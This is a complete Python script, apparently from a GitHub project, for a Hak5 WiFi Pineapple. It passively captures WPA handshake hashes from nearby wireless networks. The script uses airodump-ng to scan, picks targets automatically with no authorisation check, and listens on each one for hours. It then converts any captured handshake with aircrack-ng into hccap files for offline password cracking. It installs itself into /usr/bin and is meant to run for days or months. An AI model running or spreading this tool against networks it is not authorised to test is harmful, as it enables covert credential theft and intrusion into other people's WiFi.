#!/usr/bin/env python

###  Passive hash capture tool  #
##       { VERSION 1.9 }       ##
#           By D3falt         ###

import os
import subprocess
import time
import signal
import glob, os, os.path
import sys
import datetime
import random
import shutil
import glob
import threading

interface = ""

def firsttime():
	if os.path.isdir("/root/passive/") == False:
		print ("Creating directory: /root/passive/")
		os.makedirs("/root/passive/")
	if os.path.isdir("/root/passive/.cache/") == False:
		print ("Creating directory: /root/passive/.cache/")
		os.makedirs("/root/passive/.cache/")
	if os.path.isdir("/root/passive/.cache/scans/") == False:
		print ("Creating directory: /root/passive/.cache/scans/")
		os.makedirs("/root/passive/.cache/scans/")
	if os.path.isdir("/root/passive/.cache/processes/") == False:
		print ("Creating directory: /root/passive/.cache/processes/")
		os.makedirs("/root/passive/.cache/processes/")
	if os.path.isdir("/root/passive/.cache/captures/") == False:
		print ("Creating directory: /root/passive/.cache/captures/")
		os.makedirs("/root/passive/.cache/captures/")
	if os.path.isdir("/root/passive/.cache/convert/") == False:
		print ("Creating directory: /root/passive/.cache/convert/")
		os.makedirs("/root/passive/.cache/convert/")
	if os.path.isdir("/root/passive/.cache/aircrack/") == False:
		print ("Creating directory: /root/passive/.cache/aircrack/")
		os.makedirs("/root/passive/.cache/aircrack/")
	if os.path.isdir("/root/passive/captures/") == False:
		print ("Creating directory: /root/passive/captures/")
		os.makedirs("/root/passive/captures/")
	if os.path.isfile("/root/passive/blacklist.txt") == False:
		print ("Creating file: /root/passive/blacklist.txt")
		f = open("/root/passive/blacklist.txt","a")
		f.write(
			"## BLACKLIST LIST\n"+
			"##   The script will blacklist WIFI networks if a captured hash is found\n"+
			"##   You might also want to add your own\n"+
			"##   Add either BSSID example: \"D4:41:FC:64:66:CE\" or ESSID example: \"YourWifiName\" (without quotes)\n"
			)
		f.close()
	print ("Cloning file: "+os.path.realpath(__file__)+" ==> /usr/bin/passive")
	shutil.copy(__file__, '/usr/bin/passive')
	print ("Changing filepermission to 0755 for /usr/bin/passive")
	subprocess.call(['chmod', '+x', '/usr/bin/passive'])
	print ("\n[+] Successfully installed")
	print ("Run with this command:")
	print ("  passive wlan0mon")
	exit()

if os.path.realpath(__file__) != "/usr/bin/passive":
	if os.path.isdir("/root/passive/") == True:
		print ("Updating script...\n")
	firsttime()

def debug(text):
	global DEBUG, interface
	if DEBUG == True:
		with open("/root/passive/debug", "a") as myfile:
			now = datetime.datetime.now()
			myfile.write(now.strftime('%H:%M:%S:')+interface+": "+text+"\n")
	print (text)


def helpmenu():
	print (
		"Pineapple Passive Packet Scanner:\n"+
		"A python script for the HAK5 Pineapple. Listen to packets, and trying to get hashes without deauthentication.\n"+
		"This script is meant to be ran for days, weeks or months\n\n"+
		"--- Arguments:\n\n"+
		"  --debug / -d     Writes all \"print\" objects to /root/passive/debug\n"+
		"                   Useful for investigating for issues.\n"+
		"                   Unfortunately, no errors are written there\n\n"+
		"  --help / -h      This help menu\n\n"+
		"--- Examples:\n\n"+
		"  \"passive wlan0mon\" Starting program on wlan0mon\n"+
		"  \"passive wlan1mon --debug\" Starting program on wlan1mon with debug enabled\n\n"+
		"--- More info\n\n"+
		"  Available at https://github.com/D3faIt/pineapple-passive-packet-scanner"
	)

def bashcommand(cmd):
	os.popen(cmd)

def file_get_contents(filename):
	with open(filename) as f:
		return f.read()

def scan(interface, searchHARDER):
	## You can change this value if you want
	#
	scan_interval = 300 * searchHARDER # 300 seconds (5 minutes)
	#
	##
	os.system('cls' if os.name == 'nt' else 'clear')
	debug ("Scanning ("+str(scan_interval)+"s)")
	time.sleep(2)
	for file in glob.glob("/root/passive/.cache/scans/scan-"+interface+"*.csv"):
		if file != "":
			os.remove(file)
	process = subprocess.Popen(
		"airodump-ng "+interface+" -w /root/passive/.cache/scans/scan-"+interface+" -o csv & sleep "+str(scan_interval)+" ; kill $!",
		shell=True
	)
	out, err = process.communicate()

def findnexttarget(interface, blacklist):
	os.system('cls' if os.name == 'nt' else 'clear')
	debug ("Looking for target...")
	time.sleep(2)
	info = file_get_contents("/root/passive/.cache/scans/scan-"+interface+"-01.csv")
	busy = []
	if os.path.isfile("/root/passive/.cache/processes/"+interface) == True:
		os.remove("/root/passive/.cache/processes/"+interface)
	for file in glob.glob("/root/passive/.cache/processes/*"):
		if file != "":
			busy.append(file_get_contents(file))
	for line in info.split("\n")[::-1]:
		if "," in line and line.count(",") > 13 and line.split(",")[0] != "BSSID" and line.split(",")[13].strip() != "":
			name = line.split(",")[13].strip()
			BSSID = line.split(",")[0].strip()
			CHANNEL = line.split(",")[3].strip()
			
			if name not in blacklist + busy and BSSID not in blacklist + busy:
				f = open("/root/passive/.cache/processes/"+interface,"a")
				f.write(BSSID)
				f.close()
				#debug (name)
				return BSSID, CHANNEL, name
	return "none", "none", "none"


def capture(interface, BSSID, CHANNEL, NAME):
	os.system('cls' if os.name == 'nt' else 'clear')
	debug ("Starting capturing \""+NAME+"\" ("+BSSID+") on channel: "+CHANNEL)
	time.sleep(2)
	timeslooped = 0
	while True:
		for file in glob.glob("/root/passive/.cache/captures/"+interface+"*"):
			if file != "":
				os.remove(file)
		
		## You can change this value if you want
		#
		timeout = 1800 # 1800 seconds (30 Minutes)
		#
		##

		cmd = "airodump-ng -c "+str(CHANNEL)+" --bssid "+BSSID+" -w /root/passive/.cache/captures/"+interface + " "+ interface+ " & sleep "+str(timeout)+" ; kill $!"
		processThread = threading.Thread(target=bashcommand, args=[cmd]).start()
		time.sleep(timeout)

		if os.path.isfile("/root/passive/.cache/convert/"+interface+".cap") == True:
			os.remove("/root/passive/.cache/convert/"+interface+".cap")
		shutil.copy("/root/passive/.cache/captures/"+interface+"-01.cap", "/root/passive/.cache/convert/"+interface+".cap")
		cmd = "aircrack-ng -J /root/passive/captures/" + NAME + " /root/passive/.cache/convert/"+interface+".cap"
		output = os.popen(cmd)
		time.sleep(2)
		if os.path.isfile("/root/passive/captures/" + NAME + ".hccap") == True:
			with open("/root/passive/blacklist.txt", "a") as myfile:
				myfile.write("\n"+BSSID)
			shutil.copy("/root/passive/.cache/convert/"+interface+".cap", "/root/passive/captures/"+interface+".cap")
			debug ("Hash found on \""+NAME+"\" ("+BSSID+")\n")
			debug ("Result is saved here:")
			debug ("  /root/passive/captures/"+interface+".cap")
			debug ("  /root/passive/captures/"+interface+".hccap")
			time.sleep(5)
			break
		timeslooped +=1

		## You can change this value if you want
		#
		if timeslooped > 48: # 48 Times * 1800 seconds * 7 days
		#
		##
			os.system('cls' if os.name == 'nt' else 'clear')
			debug ("Unable to get any hashes from \""+NAME+"\" ("+BSSID+") for a period of "+str(timeslooped/2)+" Hours ...")
			debug ("WiFi might be unused or too far away")
			time.sleep(3)
			debug ("Scanning for new target...")
			time.sleep(5)
			break

DEBUG = False

if len(sys.argv) > 1:
	interface = sys.argv[1]
	for arg in sys.argv:
		if arg == "--debug" or arg == "-d":
			DEBUG = True
			if os.path.isfile("/root/passive/debug") == False:
				open("/root/passive/debug", 'a').close()
			with open("/root/passive/debug", "a") as myfile:
				now = datetime.datetime.now()
				myfile.write(now.strftime('%H:%M:%S:')+interface+": ### NEW INSTANCE STARTED"+"\n")
		if arg == "--help" or arg == "-h":
			helpmenu()
			exit()
else:
	debug ("No interface provided..")
	debug ("Example: \"passive wlan0mon\"")
	exit()

while True:
	BSSID = ""
	CHANNEL = ""
	NAME = ""
	if os.path.isfile("/root/passive/.cache/processes/"+interface) == True:
		os.remove("/root/passive/.cache/processes/"+interface)
	scan(interface, 1)
	SCANFUCKINGHARDER=1
	while True:
		## You can change this value if you want
		#
		if SCANFUCKINGHARDER == 6: # 5+10+15+20+25+30 = 105 Minutes = 1.75 Hours
		#
		##
			os.system('cls' if os.name == 'nt' else 'clear')
			debug ("Scanning for 1.75 Hours and still no available WiFi?")
			debug ("You can try these things:")
			debug ("  - Clear the blacklist.txt")
			debug ("  - Delete everything inside /root/passive/.cache/processes/")
			debug ("  - Move the Pineapple to another location")
			debug ("  - Raise an issue on GitHub: https://github.com/D3faIt/pineapple-passive-packet-scanner/issues/new")
			exit()
		blacklist = []
		for line in file_get_contents("/root/passive/blacklist.txt").split("\n"):
			if line.strip() != "" and line.strip()[0] != "#":
				blacklist.append(line.strip())

		BSSID, CHANNEL, NAME = findnexttarget(interface, blacklist)
		if BSSID == "none":
			SCANFUCKINGHARDER+=1
			scan(interface, SCANFUCKINGHARDER)
		else:
			break

	capture(interface, BSSID, CHANNEL, NAME)